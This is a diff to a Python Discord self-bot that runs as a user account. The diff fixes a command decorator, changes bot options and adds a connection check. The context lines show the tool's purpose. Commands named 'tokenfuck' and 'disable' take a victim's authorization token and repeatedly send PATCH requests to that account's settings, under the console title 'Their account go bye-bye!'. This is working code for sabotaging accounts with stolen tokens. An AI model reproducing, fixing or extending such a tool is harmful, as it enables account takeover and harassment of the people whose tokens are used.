@@ -64,7 +64,10 @@ type = (
     "offline"
     )
 
-bot = commands.Bot(command_prefix=".", self_bot=True)
+bot = commands.Bot(command_prefix=".",
+                   self_bot=True,
+                   case_insensitive=True,
+                   help_command=None)
 
 
 
@@ -171,7 +174,7 @@ async def tokenfuck(ctx, target_token):
         #print(r.content)
         time.sleep(1.5)
 
-@bot.command
+@bot.command()
 async def disable(ctx, target_token):
     ctypes.windll.kernel32.SetConsoleTitleW("Their account go bye-bye!")
     while True:
@@ -194,6 +197,11 @@ async def disable(ctx, target_token):
         r = requests.patch("https://ptb.discordapp.com/api/v6/users/@me/settings", headers={'authorization':target_token}, json=content)
         time.sleep(0.1)
 
+        
+@bot.command()
+async def isConnected(ctx):
+    await ctx.send("Connected!")        
+        
 bot.run(token_var, bot=False)
 
 
